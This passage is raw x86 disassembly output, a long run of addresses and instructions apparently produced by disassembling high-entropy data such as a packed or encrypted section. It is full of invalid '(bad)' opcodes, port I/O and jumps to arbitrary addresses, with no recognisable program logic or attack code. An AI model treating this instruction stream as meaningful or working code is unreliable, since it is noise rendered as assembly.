  421d21:	sahf   
  421d22:	jle    0x421d60
  421d24:	ss (bad) 
  421d26:	imul   edx,DWORD PTR ds:0x3e60ed45,0x3f
  421d2d:	test   BYTE PTR [eax],0xb6
  421d30:	sti    
  421d31:	mov    dl,0xb1
  421d33:	xor    al,0x38
  421d35:	cmp    DWORD PTR [ecx],ebx
  421d37:	shl    BYTE PTR [ecx-0x2a],cl
  421d3a:	pusha  
  421d3b:	out    0x8b,al
  421d3d:	fwait
  421d3e:	outs   dx,BYTE PTR ds:[esi]
  421d3f:	xor    DWORD PTR [ebp+0x59],eax
  421d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d43:	pop    ebx
  421d44:	cmp    eax,0x55970817
  421d49:	rcr    BYTE PTR [eax+0x576c0aef],1
  421d4f:	sbb    bl,bh
  421d51:	add    bh,BYTE PTR [ecx+0xbb4af75]
  421d57:	loope  0x421d97
  421d59:	out    0xb8,al
  421d5b:	or     DWORD PTR [eax+0x6f91129],0xa81b824e
  421d65:	inc    esp
  421d66:	mov    ebp,0x1a4e04eb
  421d6b:	xchg   ebx,eax
  421d6c:	aas    
  421d6d:	fidivr WORD PTR [ebx+0x5a7836dc]
  421d73:	xlat   BYTE PTR ds:[ebx]
  421d74:	fsub   st(2),st
  421d76:	jnp    0x421db9
  421d78:	pop    ss
  421d79:	ds dec ebx
  421d7b:	mov    cl,0xc8
  421d7d:	pop    esp
  421d7e:	mov    esi,DWORD PTR [edx-0x3cd4c073]
  421d84:	mov    eax,0x551f5f4b
  421d89:	retf   
  421d8a:	stos   BYTE PTR es:[edi],al
  421d8b:	inc    ebp
  421d8c:	mov    dl,0x46
  421d8e:	add    DWORD PTR [esi-0x4],ebp
  421d91:	aad    0xdb
  421d93:	mov    esp,0xbe52cdb4
  421d98:	cmp    al,0x39
  421d9a:	sub    BYTE PTR [ecx+0x75b832b3],bl
  421da0:	pop    esi
  421da1:	cld    
  421da2:	jge    0x421d24
  421da4:	stc    
  421da5:	xor    BYTE PTR [esi+eiz*8],0xf
  421da9:	nop
  421daa:	data16 sti 
  421dac:	jl     0x421de1
  421dae:	push   edi
  421daf:	adc    edx,DWORD PTR [edx]
  421db1:	xchg   ebx,eax
  421db2:	idiv   DWORD PTR [ecx+edi*4]
  421db5:	scas   eax,DWORD PTR es:[edi]
  421db6:	xor    BYTE PTR [esi-0x8172fa1],0xc3
  421dbd:	popa   
  421dbe:	xchg   ebx,eax
  421dbf:	popa   
  421dc0:	clc    
  421dc1:	dec    esp
  421dc2:	out    dx,al
  421dc3:	cld    
  421dc4:	xchg   edi,eax
  421dc5:	sbb    DWORD PTR [edx-0x22c886c7],eax
  421dcb:	sbb    DWORD PTR [ebx+0x1a7ec8e],ebx
  421dd1:	(bad)  
  421dd2:	popf   
  421dd3:	(bad)  
  421dd4:	and    al,0xe1
  421dd6:	add    ah,dh
  421dd8:	popa   
  421dd9:	sub    eax,0x37ff2ad7
  421dde:	in     al,dx
  421ddf:	cli    
  421de0:	inc    ecx
  421de1:	fimul  DWORD PTR [edi+0x45c1c2c9]
  421de7:	xchg   BYTE PTR [eax],ch
  421de9:	je     0x421dbd
  421deb:	ds mov bh,0xef
  421dee:	(bad)  [esi+ecx*1+0x25]
  421df2:	and    dl,ah
  421df4:	pop    ss
  421df5:	test   al,0xcf
  421df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421df8:	mov    cl,0x7d
  421dfa:	arpl   WORD PTR [ebx-0x72],bp
  421dfd:	dec    ecx
  421dfe:	cs in  al,dx
  421e00:	cmp    BYTE PTR [edi-0x638047df],ch
  421e06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e07:	mov    cs,ebx
  421e09:	scas   eax,DWORD PTR es:[edi]
  421e0a:	push   cs
  421e0b:	push   es
  421e0c:	xchg   bl,al
  421e0e:	pop    es
  421e0f:	mov    WORD PTR [eax],ds
  421e11:	xchg   esi,eax
  421e12:	ret    0x168
  421e15:	push   ebx
  421e16:	sub    al,0xa0
  421e18:	das    
  421e19:	sbb    ch,dh
  421e1b:	sbb    ah,cl
  421e1d:	cmp    edi,DWORD PTR ds:0x12792931
  421e23:	xchg   ecx,eax
  421e24:	xlat   BYTE PTR ds:[ebx]
  421e25:	or     DWORD PTR [esi],eax
  421e27:	pop    esi
  421e28:	das    
  421e29:	xor    dl,0x53
  421e2c:	xchg   edi,esi
  421e2e:	and    BYTE PTR [eax-0x4a90863],0xd
  421e35:	imul   edx,DWORD PTR ds:0xeb93ff75,0x3468ac06
  421e3f:	aaa    
  421e40:	sub    ecx,DWORD PTR [ecx-0x61040047]
  421e46:	ficomp DWORD PTR [ebp-0x10efb553]
  421e4c:	test   DWORD PTR [eax+esi*2-0x2e],edi
  421e50:	push   0x5
  421e52:	(bad)  
  421e53:	mov    ch,0x4a
  421e55:	mov    ch,0x21
  421e57:	mov    al,BYTE PTR [ecx+0x45605936]
  421e5d:	xchg   ebp,eax
  421e5e:	cmp    eax,0x7c753ab8
  421e63:	into   
  421e64:	mov    ebp,0xdff9dce0
  421e69:	mov    ebp,0xbeb2e81
  421e6e:	fs ret 
  421e70:	(bad)  
  421e71:	loopne 0x421ea8
  421e73:	fcomip st,st(4)
  421e75:	shl    BYTE PTR [ebp+0x31],cl
  421e78:	out    dx,al
  421e79:	push   ds
  421e7a:	inc    esp
  421e7b:	(bad)  
  421e7c:	in     eax,dx
  421e7d:	sub    al,0x7
  421e7f:	mov    cl,0x9
  421e81:	pop    ebx
  421e82:	mov    ds:0xc994ec8e,al
  421e87:	mov    WORD PTR [eax],es
  421e89:	dec    edi
  421e8a:	push   ebp
  421e8b:	xor    DWORD PTR [ecx],ebx
  421e8d:	aaa    
  421e8e:	add    BYTE PTR [edx+ecx*4+0x572845fe],cl
  421e95:	dec    ebx
  421e96:	add    dh,BYTE PTR [ebp+eax*8-0x4e]
  421e9a:	cld    
  421e9b:	(bad)  
  421e9c:	mov    dh,0x1e
  421e9e:	push   edx
  421e9f:	(bad)  
  421ea0:	sbb    BYTE PTR [eax-0x1],0x10
  421ea4:	pop    edi
  421ea5:	and    eax,0xddd1a8be
  421eaa:	inc    esi
  421eab:	mov    al,ds:0x5c763bf3
  421eb0:	inc    ecx
  421eb1:	and    eax,0xd4d8db4d
  421eb6:	push   edx
  421eb7:	outs   dx,BYTE PTR ds:[esi]
  421eb8:	cs inc esp
  421eba:	in     al,0xc6
  421ebc:	add    al,0x8d
  421ebe:	test   al,0x6a
  421ec0:	xor    al,0xa7
  421ec2:	sbb    DWORD PTR [esi],ebx
  421ec4:	mov    esi,DWORD PTR ds:0xe3a3a46d
  421eca:	sub    esp,ebx
  421ecc:	rol    DWORD PTR [edx+0x423cae5b],0x4c
  421ed3:	ror    DWORD PTR [edi-0x7e],0xb5
  421ed7:	jnp    0x421e81
  421ed9:	or     eax,0xa0347023
  421ede:	adc    eax,0x2285a5d9
  421ee3:	ins    BYTE PTR es:[edi],dx
  421ee4:	js     0x421e66
  421ee6:	pop    ebx
  421ee7:	push   edx
  421ee8:	adc    ecx,DWORD PTR [ebx]
  421eea:	ss out dx,al
  421eec:	or     BYTE PTR [ebp-0x79],ah
  421eef:	(bad)  
  421ef1:	sub    al,0xd0
  421ef3:	inc    ebp
  421ef4:	jp     0x421e85
  421ef6:	out    0x90,al
  421ef8:	sub    dl,al
  421efa:	loop   0x421f1b
  421efc:	xchg   esp,eax
  421efd:	and    ebp,DWORD PTR [eax-0x1d]
  421f00:	xor    al,0xf
  421f02:	jmp    0x7d039934
  421f07:	leave  
  421f08:	push   esi
  421f09:	mov    edi,0xca80beb5
  421f0e:	fimul  WORD PTR [edi]
  421f10:	jbe    0x421ed6
  421f12:	jmp    0x2ea6:0xe1d1cd1d
  421f19:	popa   
  421f1a:	imul   ecx,DWORD PTR [esi-0x4c],0xb384de59
  421f21:	mov    esi,0x7f643f9e
  421f26:	icebp  
  421f27:	mov    ch,0x8f
  421f29:	sbb    eax,DWORD PTR [esi]
  421f2b:	lods   eax,DWORD PTR ds:[esi]
  421f2c:	mov    ecx,0x54d0a80f
  421f31:	sbb    bl,bh
  421f33:	jp     0x421f28
  421f35:	ins    DWORD PTR es:[edi],dx
  421f36:	not    BYTE PTR [ecx]
  421f38:	dec    ebp
  421f39:	mov    BYTE PTR [edx+0x2600c296],ah
  421f3f:	jecxz  0x421ecc
  421f41:	push   esp
  421f42:	and    al,0xc8
  421f44:	xchg   esp,eax
  421f45:	and    dh,BYTE PTR [ecx+0x4d85d078]
  421f4b:	cmp    al,0xf3
  421f4d:	adc    DWORD PTR [edi],ebx
  421f4f:	mov    dh,cl
  421f51:	pop    ss
  421f52:	lods   eax,DWORD PTR ds:[esi]
  421f53:	dec    esp
  421f54:	pop    esi
  421f55:	dec    ebp
  421f56:	out    0xad,al
  421f58:	fwait
  421f59:	js     0x421f8c
  421f5b:	and    eax,0xd1645fb6
  421f60:	sahf   
  421f61:	or     BYTE PTR [edi],bh
  421f63:	imul   esp,ecx,0xa57a6481
  421f69:	xor    DWORD PTR [edi],0x4ab80b7
  421f6f:	cmp    DWORD PTR [edx],esp
  421f71:	cdq    
  421f72:	repz mov ebx,0x64fd9c7
  421f78:	loopne 0x421fa5
  421f7a:	in     al,0x19
  421f7c:	in     eax,dx
  421f7d:	mov    ch,0x67
  421f7f:	scas   al,BYTE PTR es:[edi]
  421f80:	mov    al,ds:0x13ed1485
  421f85:	mov    ebp,0x4d26280b
  421f8a:	add    eax,0xd8ea4e9c
  421f8f:	loop   0x421f88
  421f91:	and    DWORD PTR [ebp-0x2a461cc7],0xffffffa9
  421f98:	lahf   
  421f99:	mov    al,0x6a
  421f9b:	inc    esi
  421f9c:	pop    ss
  421f9d:	mov    ecx,0xc1e2739
  421fa2:	xchg   DWORD PTR [edi+ebx*2-0x142fe186],ebx
  421fa9:	lods   al,BYTE PTR ds:[esi]
  421faa:	inc    ebx
  421fab:	lods   al,BYTE PTR ds:[esi]
  421fac:	fimul  WORD PTR [esi+eiz*4-0x46]
  421fb0:	add    al,0x9
  421fb2:	jl     0x421f36
  421fb4:	sahf   
  421fb5:	cmp    edi,ecx
  421fb7:	inc    ebp
  421fb8:	mov    WORD PTR [ebx],gs
  421fba:	pushf  
  421fbb:	clc    
  421fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fbd:	cwde   
  421fbe:	outs   dx,DWORD PTR ds:[esi]
  421fbf:	dec    edx
  421fc0:	mov    edi,0x7858306a
  421fc5:	scas   al,BYTE PTR es:[edi]
  421fc6:	and    BYTE PTR [eax+0x19],bh
  421fc9:	mov    cl,0x34
  421fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fcc:	and    al,0x7d
  421fce:	jmp    0x421f78
  421fd0:	stc    
  421fd1:	pop    ecx
  421fd2:	pop    ss
  421fd3:	and    edx,DWORD PTR [edi-0xc640bb4]
  421fd9:	sbb    DWORD PTR ds:0x87f998b7,ecx
  421fdf:	dec    esp
  421fe0:	(bad)  
  421fe1:	jle    0x421f70
  421fe3:	imul   ecx,ebx,0xffffff91
  421fe6:	adc    DWORD PTR [edi+0x739ed856],ecx
  421fec:	sub    bh,BYTE PTR [ecx+0x4b]
  421fef:	(bad)  
  421ff0:	gs mov bl,0x34
  421ff3:	push   es
  421ff4:	fst    DWORD PTR [ebx]
  421ff6:	ss push edi
  421ff8:	jae    0x421fee
  421ffa:	xchg   esi,eax
  421ffb:	push   esi
  421ffc:	or     eax,0x807c8a7b
  422001:	and    BYTE PTR [edi-0x3d8fccbf],ah
  422007:	loop   0x42202f
  422009:	ins    DWORD PTR es:[edi],dx
  42200a:	jnp    0x421fae
  42200c:	mov    BYTE PTR [ebp-0x38],0x70
  422010:	jb     0x421fc0
  422012:	(bad)  
  422013:	cmp    DWORD PTR [edx+eax*2-0x519a01b7],0xffffffe6
  42201b:	inc    ebp
  42201c:	repz les eax,FWORD PTR [esi]
  42201f:	and    BYTE PTR [esi+0x281ee41e],ah
  422025:	addr16 loop 0x422019
  422028:	push   ds
  422029:	push   cs
  42202a:	sub    esp,eax
  42202c:	sub    ch,bh
  42202e:	bound  esi,QWORD PTR [ecx-0x53]
  422031:	aad    0xb
  422033:	mov    DWORD PTR cs:[edx+0x653dbcd6],ecx
  42203a:	cmc    
  42203b:	adc    al,BYTE PTR [ecx-0x3f86e592]
  422041:	pop    edi
  422042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422043:	xchg   esi,eax
  422044:	jbe    0x421fcf
  422046:	sub    al,dh
  422048:	stos   DWORD PTR es:[edi],eax
  422049:	mov    bh,0x5c
  42204b:	inc    eax
  42204c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42204d:	js     0x422015
  42204f:	sahf   
  422050:	cmp    eax,0x45e41452
  422055:	adc    edx,DWORD PTR [edx-0x2d]
  422058:	loop   0x4220c4
  42205a:	or     BYTE PTR [eax],dl
  42205c:	xchg   ecx,eax
  42205d:	sub    bl,BYTE PTR [ebp+0x65987920]
  422063:	and    al,0xf3
  422065:	sbb    edx,ecx
  422067:	xor    al,0x8
  422069:	jmp    0x6db9df07
  42206e:	xor    BYTE PTR [ecx*8+0x5ecf57d9],0x2
  422076:	fmul   DWORD PTR [edx-0x2]
  422079:	inc    ecx
  42207a:	aad    0xcb
  42207c:	retf   
  42207d:	test   al,0xdd
  42207f:	loope  0x422088
  422081:	rol    DWORD PTR [ebp+0x56],0xb1
  422085:	pop    esi
  422086:	adc    ebp,ebp
  422088:	imul   ebx,ebx,0x4e
  42208b:	push   eax
  42208c:	mov    cl,0x31
  42208e:	in     eax,dx
  42208f:	add    BYTE PTR [esi+0x4a147751],0xa3
  422096:	xchg   ebp,eax
  422097:	sub    eax,0xcc9f302d
  42209c:	mov    bh,0x9f
  42209e:	push   0xa5ec250
  4220a3:	push   ss
  4220a4:	xor    bl,BYTE PTR [eax-0x73209862]
  4220aa:	jae    0x42203f
  4220ac:	enter  0x6453,0xdd
  4220b0:	mov    bh,0xc
  4220b2:	bound  esp,QWORD PTR [ebx]
  4220b4:	imul   ebp,DWORD PTR [ebx+0x33],0xffffffcc
  4220b8:	lahf   
  4220b9:	not    sp
  4220bc:	(bad)  
  4220bd:	jmp    0x763f8adb
  4220c2:	inc    esp
  4220c3:	cmp    esi,DWORD PTR [esi+edi*4]
  4220c6:	mov    esp,0xc936e1da
  4220cb:	dec    esp
  4220cc:	enter  0x30d,0xa2
  4220d0:	cmp    al,0x49
  4220d2:	or     eax,0x8798f510
  4220d7:	push   edi
  4220d8:	sub    DWORD PTR [ecx+edx*8],ebp
  4220db:	sub    eax,0xf5fb083f
  4220e0:	shl    DWORD PTR [eax],1
  4220e2:	dec    esp
  4220e3:	das    
  4220e4:	imul   eax,DWORD PTR [esp+esi*2-0x57],0x23
  4220e9:	or     BYTE PTR ds:0x9f896682,ch
  4220ef:	jmp    0xdada08ac
  4220f4:	xchg   esi,eax
  4220f5:	rcr    BYTE PTR [ebp+0x5e],cl
  4220f8:	dec    edx
  4220f9:	jb     0x422149
  4220fb:	stos   BYTE PTR es:[edi],al
  4220fc:	sbb    al,0xc2
  4220fe:	cdq    
  4220ff:	cmp    BYTE PTR [esi+ecx*1+0x613d7475],dl
  422106:	inc    edx
  422107:	lahf   
  422108:	icebp  
  422109:	xor    eax,0x7d458fb7
  42210e:	sub    eax,0x9d9b1a03
  422113:	lods   al,BYTE PTR ds:[esi]
  422114:	ss popa 
  422116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422117:	xor    dh,BYTE PTR [ecx+0x7a]
  42211a:	out    0xf1,eax
  42211c:	call   0xf08a:0x5eb5de14
  422123:	(bad)  
  422124:	arpl   WORD PTR [edx],ax
  422126:	xchg   DWORD PTR [ebx],edi
  422128:	xchg   esp,eax
  422129:	and    DWORD PTR [esi+0x3ab336c6],esi
  42212f:	inc    edx
  422130:	ss push esp
  422132:	loop   0x422111
  422134:	xor    ch,BYTE PTR [ecx+eiz*2+0x48644589]
  42213b:	push   0x308f5c61
  422140:	lds    eax,FWORD PTR [ebp-0x6e]
  422143:	inc    edx
  422144:	and    BYTE PTR [esi+0x9],dl
  422147:	ins    BYTE PTR es:[edi],dx
  422148:	and    cl,cl
  42214a:	addr16 nop
  42214c:	xor    dl,BYTE PTR [edx]
  42214e:	and    al,0xff
  422150:	hlt    
  422151:	bound  ebx,QWORD PTR [edi]
  422153:	pop    eax
  422154:	mov    bl,0xfb
  422156:	rcl    edx,1
  422158:	loop   0x42217b
  42215a:	adc    eax,0xe561a152
  42215f:	dec    esi
  422160:	ret    0xca9e
  422163:	jg     0x4221aa
  422165:	pop    ebp
  422166:	mov    dl,0xb9
  422168:	in     al,dx
  422169:	pop    ecx
  42216a:	js     0x42214c
  42216c:	pusha  
  42216d:	push   ebp
  42216e:	outs   dx,BYTE PTR ds:[esi]
  42216f:	test   eax,0xbf0debfe
  422174:	retf   
  422175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422176:	sbb    esp,DWORD PTR [edx+0x5f957bd8]
  42217c:	cmp    DWORD PTR [edx+0x68],ebp
  42217f:	popf   
  422180:	mov    DWORD PTR [ebx-0x71],ebx
  422183:	and    dh,BYTE PTR [ecx+0x51e2559c]
  422189:	adc    BYTE PTR [ecx+ebp*8-0x3cd6b840],0xbc
  422191:	es (bad) 
  422193:	hlt    
  422194:	cs push eax
  422196:	inc    ecx
  422197:	inc    edi
  422198:	hlt    
  422199:	test   DWORD PTR [ebx-0x78],eax
  42219c:	gs ffree st(7)
  42219f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221a0:	fdivr  QWORD PTR [ebp+0x42]
  4221a3:	scas   eax,DWORD PTR es:[edi]
  4221a4:	and    ebx,DWORD PTR [ebx]
  4221a6:	aaa    
  4221a7:	lods   al,BYTE PTR ds:[esi]
  4221a8:	jno    0x42212c
  4221aa:	cmc    
  4221ab:	cli    
  4221ac:	sbb    DWORD PTR [edx],esi
  4221ae:	sbb    eax,0xd001a15f
  4221b3:	add    al,0x7b
  4221b5:	out    dx,eax
  4221b6:	out    dx,eax
  4221b7:	jmp    0xb6b969bb
  4221bc:	xchg   esp,eax
  4221bd:	and    ebx,DWORD PTR [ecx-0x388f0b04]
  4221c3:	aam    0x36
  4221c5:	push   eax
  4221c6:	or     ecx,DWORD PTR [esi+0x52d8cd7e]
  4221cc:	enter  0xf000,0xad
  4221d0:	and    al,0x49
  4221d2:	and    BYTE PTR [eax+ebx*1+0x2f],bl
  4221d6:	repnz mov al,BYTE PTR [edi]
  4221d9:	lock enter 0xf541,0xe1
  4221de:	pop    es
  4221df:	pop    eax
  4221e0:	push   es
  4221e1:	jae    0x42223c
  4221e3:	dec    ecx
  4221e4:	mov    dh,cl
  4221e6:	mov    esp,0x63d0817e
  4221eb:	mov    al,ds:0xa36c6ee0
  4221f0:	inc    ebp
  4221f1:	dec    ecx
  4221f2:	test   BYTE PTR [esi-0x10],bl
  4221f5:	sub    al,0x86
  4221f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221f8:	ins    DWORD PTR es:[edi],dx
  4221f9:	adc    DWORD PTR [edi-0x13],ebp
  4221fc:	outs   dx,BYTE PTR ds:[esi]
  4221fd:	test   dh,ah
  4221ff:	std    
  422200:	shl    bl,1
  422202:	pop    edi
  422203:	xchg   edx,eax
  422204:	jg     0x4221d1
  422206:	jmp    0x1d999bb6
  42220b:	sub    BYTE PTR [ebx],bh
  42220d:	sbb    DWORD PTR [eax-0x4064e9b4],edi
  422213:	lahf   
  422214:	inc    edi
  422215:	icebp  
  422216:	es or  al,0x4c
  422219:	add    dl,dl
  42221b:	mov    ds:0xcbb3bd9d,eax
  422220:	out    0x57,al
  422222:	cmp    al,al
  422224:	sbb    ch,BYTE PTR [eax]
  422226:	mov    eax,0x6265d135
  42222b:	call   0x32c3:0x3a5c81b8
  422232:	ret    
  422233:	mov    al,0x47
  422235:	jp     0x422265
  422237:	inc    edx
  422238:	stos   DWORD PTR es:[edi],eax
  422239:	add    al,0xca
  42223b:	lahf   
  42223c:	fild   QWORD PTR [edi]
  42223e:	test   DWORD PTR [eax+0x5aa369e7],0xf51eade
  422248:	push   edx
  422249:	adc    eax,0x49300063
  42224e:	enter  0xc010,0x11
  422252:	dec    edi
  422253:	jno    0x42229c
  422255:	sar    DWORD PTR [ebp*1+0x98b147f],0x5a
  42225d:	dec    esp
  42225e:	xchg   esp,eax
  42225f:	cmp    eax,0x8a5a2a1
  422264:	icebp  
  422265:	inc    edx
  422266:	sub    esp,ecx
  422268:	loop   0x422295
  42226a:	mov    dl,0x29
  42226c:	inc    esp
  42226d:	jle    0x4222ae
  42226f:	rol    DWORD PTR [edx],cl
  422271:	mov    eax,0x113679dd
  422276:	js     0x42228b
  422278:	dec    eax
  422279:	int    0x8f
  42227b:	xchg   DWORD PTR [ecx+ebx*2-0x27cafb3a],ebx
  422282:	lock mov edi,0x9a67e44b
  422288:	and    al,0xf
  42228a:	mov    dh,0xe
  42228c:	fld    TBYTE PTR [ecx+ecx*8]
  42228f:	adc    al,0xe
  422291:	gs xchg esi,eax
  422293:	lahf   
  422294:	jl     0x422291
  422296:	aam    0x89
  422298:	imul   esp,edx,0x0
  42229b:	mov    al,0x67
  42229d:	or     DWORD PTR [esi+0x6cdde229],0x59
  4222a4:	and    DWORD PTR [edx-0x1dea1119],0x481a3b29
  4222ae:	fisub  WORD PTR [ecx+eax*2]
  4222b1:	mov    esp,0x76707d32
  4222b6:	sbb    ecx,ebp
  4222b8:	inc    ebp
  4222b9:	cmp    al,0x78
  4222bb:	jne    0x422280
  4222bd:	cdq    
  4222be:	xor    esi,DWORD PTR [edi]
  4222c0:	or     BYTE PTR fs:[esi],dh
  4222c3:	xchg   BYTE PTR [ebp-0x44a04500],dh
  4222c9:	sar    BYTE PTR ds:0x93f75b43,0xb9
  4222d0:	test   DWORD PTR [edi-0x3f0a4afd],0x8ef8da8d
  4222da:	(bad)
  4222dd:	or     eax,DWORD PTR [edx-0x10]
  4222e0:	add    eax,0x48434ff4
  4222e5:	out    0x58,al
  4222e7:	mov    esi,0x67c81119
  4222ec:	add    edx,DWORD PTR [edi-0x1e]
  4222ef:	jae    0x42235b
  4222f1:	dec    eax
  4222f2:	pop    ecx
  4222f3:	cmp    cl,BYTE PTR [ecx-0x56e67b83]
  4222f9:	(bad)  
  4222fa:	(bad)  
  4222fb:	push   cs
  4222fc:	daa    
  4222fd:	xchg   ebx,esi
  4222ff:	adc    esp,DWORD PTR [ecx-0x617ebada]
  422305:	sub    ebx,DWORD PTR [edx]
  422307:	pop    esp
  422308:	push   eax
  422309:	into   
  42230a:	inc    ebx
  42230b:	inc    ebx
  42230c:	adc    DWORD PTR [ebx-0x62d09e7f],ecx
  422312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422313:	repz fiadd WORD PTR [esi-0x3c]
  422317:	int3   
  422318:	daa    
  422319:	xor    al,0x1b
  42231b:	aam    0xbd
  42231d:	stos   BYTE PTR es:[edi],al
  42231e:	(bad)  
  42231f:	out    0x40,eax
  422321:	xor    DWORD PTR [edx+eax*4+0x6b],esp
  422325:	arpl   WORD PTR [esi-0x4e],bp
  422328:	ja     0x422391
  42232a:	and    DWORD PTR [esi],edi
  42232c:	in     eax,0xa0
  42232e:	enter  0xaabe,0xdd
  422332:	data16 cmp BYTE PTR [ebx],bl
  422335:	pop    ss
  422336:	dec    esi
  422337:	adc    eax,0x21e4c07c
  42233c:	or     esp,DWORD PTR [eax+ebx*2+0x73647609]
  422343:	push   edi
  422344:	daa    
  422345:	rcl    DWORD PTR [eax-0x78145201],1
  42234b:	bound  ebp,QWORD PTR [ebx]
  42234d:	push   ebx
  42234e:	ffree  st(5)
  422350:	in     eax,dx
  422351:	loopne 0x422310
  422353:	jnp    0x4222fe
  422355:	jns    0x422398
  422357:	cli    
  422358:	mov    ebx,0x8f5fa70b
  42235d:	aam    0x39
  42235f:	pop    es
  422360:	cmp    eax,DWORD PTR [eax+0x45d8a1f2]
  422366:	mov    al,ds:0xf3e78f13
  42236b:	and    DWORD PTR ds:0xbbcbd4a5,eax
  422371:	push   ecx
  422372:	add    dh,dh
  422374:	ficomp WORD PTR [ebx+0x4e]
  422377:	(bad)  [ecx-0x4dfa5314]
  42237d:	sub    BYTE PTR [esi],ah
  42237f:	cdq    
  422380:	adc    BYTE PTR [eax],bl
  422382:	mov    bh,BYTE PTR [eax+ecx*1-0x3e59a583]
  422389:	enter  0x3992,0xa9
  42238d:	sbb    BYTE PTR [ebx+ebp*8-0x9],cl
  422391:	ja     0x4223e9
  422393:	fs push edi
  422395:	out    dx,eax
  422396:	jb     0x42236f
  422398:	test   eax,ebp
  42239a:	add    DWORD PTR [esi],esp
  42239c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42239d:	in     eax,dx
  42239e:	mov    edi,0xb0b98316
  4223a3:	or     DWORD PTR [esp+esi*1-0x3cbc3f7b],ecx
  4223aa:	pushf  
  4223ab:	scas   eax,DWORD PTR es:[edi]
  4223ac:	in     al,0x61
  4223ae:	fisttp WORD PTR [edi+0x2bb3cc]
  4223b4:	fsubrp st(5),st
  4223b6:	xchg   ebx,eax
  4223b7:	repnz dec edi
  4223b9:	cwde   
  4223ba:	xchg   ebp,eax
  4223bb:	adc    DWORD PTR [ebp+0xdf7ef0],ecx
  4223c1:	push   ds
  4223c2:	fimul  DWORD PTR [ecx-0x947c3ba]
  4223c8:	lahf   
  4223c9:	test   edi,ecx
  4223cb:	lods   eax,DWORD PTR ds:[esi]
  4223cc:	(bad)  
  4223cd:	out    0xf3,al
  4223cf:	shl    esi,0x30
  4223d2:	xchg   DWORD PTR [edi+ebp*2],ebp
  4223d5:	lea    edx,[esi-0xc]
  4223d8:	inc    ecx
  4223d9:	pop    eax
  4223da:	out    dx,eax
  4223db:	es mov edi,0x86a7a68a
  4223e1:	adc    esi,DWORD PTR [edi+0x36]
  4223e4:	inc    edi
  4223e5:	adc    esp,DWORD PTR [esi]
  4223e7:	fisttp WORD PTR [edx-0x30]
  4223ea:	pop    eax
  4223eb:	outs   dx,DWORD PTR ds:[esi]
  4223ec:	stos   BYTE PTR es:[edi],al
  4223ed:	jmp    0xcc9b46f4
  4223f2:	nop
  4223f3:	pop    ebx
  4223f4:	iret   
  4223f5:	adc    DWORD PTR [esi+0x2b],eax
  4223f8:	adc    al,0xf1
  4223fb:	sti    
  4223fc:	fldz   
  4223fe:	lods   eax,DWORD PTR ds:[esi]
  4223ff:	stos   DWORD PTR es:[edi],eax
  422400:	cmp    bl,BYTE PTR [eax]
  422402:	imul   ebp,DWORD PTR [eax+edi*1],0x65392f34
  422409:	sub    al,0xa2
  42240b:	and    al,0xd9
  42240d:	(bad)  
  42240e:	sub    al,BYTE PTR [eax]
  422410:	dec    edi
  422411:	or     bh,BYTE PTR [edi-0x1e]
  422414:	mov    bh,BYTE PTR [edx+0x334930e4]
  42241a:	call   0x6c2f:0x5992c3a0
  422421:	mov    dl,0x23
  422423:	cmp    al,0x52
  422425:	push   edx
  422426:	pop    edx
  422427:	dec    ecx
  422428:	in     eax,dx
  422429:	and    eax,0xffffffb4
  42242c:	call   0xf70f:0x3432e7b2
  422433:	adc    al,0xd5
  422435:	mov    dl,0xa2
  422437:	dec    esp
  422438:	iret   
  422439:	bound  ebp,QWORD PTR [ecx+0x2f5844b6]
  42243f:	loopne 0x4223d6
  422441:	stos   BYTE PTR es:[edi],al
  422442:	pop    ebp
  422443:	test   eax,0xf465acb7
  422448:	es fsubp st(1),st
  42244b:	adc    DWORD PTR [ebx+eax*4+0x6f],esp
  42244f:	mov    ebx,0xa031bbd4
  422454:	sub    al,0x2e
  422456:	and    bl,ch
  422458:	cli    
  422459:	jne    0x422438
  42245b:	adc    ah,BYTE PTR [ebp-0x6f9256e8]
  422461:	inc    ebx
  422462:	adc    ch,bh
  422464:	test   DWORD PTR [eax],eax
  422466:	pop    edx
  422467:	(bad)  
  422468:	sbb    eax,0xdde5531f
  42246d:	lods   eax,DWORD PTR ds:[esi]
  42246e:	inc    DWORD PTR [ebp+0x79]
  422471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422472:	inc    ebp
  422473:	mov    al,0xe8
  422475:	fwait
  422476:	aaa    
  422477:	dec    esi
  422478:	rcl    al,cl
  42247a:	adc    DWORD PTR [ebx-0x4],eax
  42247d:	icebp  
  42247e:	xchg   ebp,eax
  42247f:	cmp    ebp,DWORD PTR [eax-0xe]
  422482:	inc    esi
  422483:	adc    esi,DWORD PTR [ecx+edx*8+0x7082b82b]
  42248a:	sahf   
  42248b:	ret    
  42248c:	mov    esi,0x266b2fc7
  422491:	fs add cl,al
  422494:	ins    BYTE PTR es:[edi],dx
  422495:	sahf   
  422496:	lea    ebp,[ebp-0x2d]
  422499:	jbe    0x422436
  42249b:	ja     0x42244f
  42249d:	and    DWORD PTR [eax-0x1864daa8],0xffffffa7
  4224a4:	pushf  
  4224a5:	xor    DWORD PTR [eax-0x7d],0xcb0ba129
  4224ac:	pop    ebp
  4224ad:	fcomp  st(4)
  4224af:	sub    BYTE PTR [ebx-0x1f],al
  4224b2:	jmp    0xf76657d
  4224b7:	mov    al,ds:0x277c2fe
  4224bc:	jge    0x4224ca
  4224be:	push   es
  4224bf:	mov    ebp,0x1da52393
  4224c4:	dec    ecx
  4224c5:	xor    BYTE PTR [esi-0x26246aa4],ch
  4224cb:	or     eax,0x7d9fcaff
  4224d0:	inc    esp
  4224d1:	stc    
  4224d2:	push   edi
  4224d3:	jne    0x422485
  4224d5:	adc    BYTE PTR [ecx],dh
  4224d7:	fmul   QWORD PTR [esi]
